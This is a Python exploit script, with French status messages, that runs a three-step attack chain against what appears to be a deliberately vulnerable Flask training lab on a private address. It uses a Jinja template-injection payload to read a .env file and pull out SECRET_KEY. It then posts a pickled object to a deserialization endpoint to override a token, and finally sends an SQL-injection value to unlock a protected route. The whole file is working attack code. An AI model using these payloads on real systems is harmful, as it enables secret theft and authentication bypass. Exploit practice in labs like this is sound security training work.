#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import pickle
import re

BASE_URL = "http://192.168.4.24:5000"

def step1_jinja_template_injection():
    payload = "{{ open('/home/Ad_@min/flask_app/levels/version_3/.env.vuln').read() }}"
    url = f"{BASE_URL}/vuln/template?q={payload}"
    print("[*] Lecture du .env.vuln via SSTI")
    r = requests.get(url)
    if r.status_code == 200:
        print("[+] Contenu de .env.vuln :")
        print(r.text)
        match = re.search(r"SECRET_KEY\s*=\s*([^\n\r]+)", r.text)
        if match:
            secret_key = match.group(1).strip()
            print(f"[+] SECRET_KEY : {secret_key}")
            return secret_key
        else:
            print("[-] SECRET_KEY non trouvée")
            return None
    else:
        print(f"[-] Erreur HTTP {r.status_code}")
        return None

def step2_pickle_deserialize(malicious_token):
    print("[*] Injection Pickle (token override)")
    payload = pickle.dumps({"set_token": malicious_token})
    url = f"{BASE_URL}/vuln/deserialize"
    r = requests.post(url, data=payload)
    print("[+] Réponse /vuln/deserialize :", r.text)

def step3_injection_sql(malicious_token):
    print("[*] Injection SQL pour unlock")
    update_value = "unlock'%20--%20"
    url = f"{BASE_URL}/vuln/serrure?token={malicious_token}&update={update_value}"
    r = requests.post(url)
    print("[+] Réponse /vuln/serrure :", r.text)

def main():
    secret_key = step1_jinja_template_injection()
    if not secret_key:
        print("[-] Impossible de continuer sans SECRET_KEY.")
        return
    malicious_token = secret_key
    step2_pickle_deserialize(malicious_token)
    step3_injection_sql(malicious_token)
    print("[*] Chaîne d'exploitation terminée.")

if __name__ == "__main__":
    main()
